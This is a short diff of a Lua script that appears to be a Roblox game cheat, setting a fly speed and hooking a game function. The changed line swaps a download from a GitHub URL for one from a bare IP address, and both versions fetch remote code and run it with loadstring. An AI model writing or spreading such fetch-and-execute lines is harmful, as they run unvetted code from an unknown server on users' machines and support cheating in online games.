@@ -4,7 +4,7 @@ if _G.FlySpeed then
 end
 _G.FlySpeed = 68
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Helloa123y/Scripts/refs/heads/main/AimRange.lua"))()
+loadstring(game:HttpGet("http://116.202.8.65:3000/get-s?name=AimRange"))()
 -- Hook ContentProvider.PreloadAsync to prevent some potential crashes
 hookfunction(game:GetService("ContentProvider").PreloadAsync, function(...) end)
 
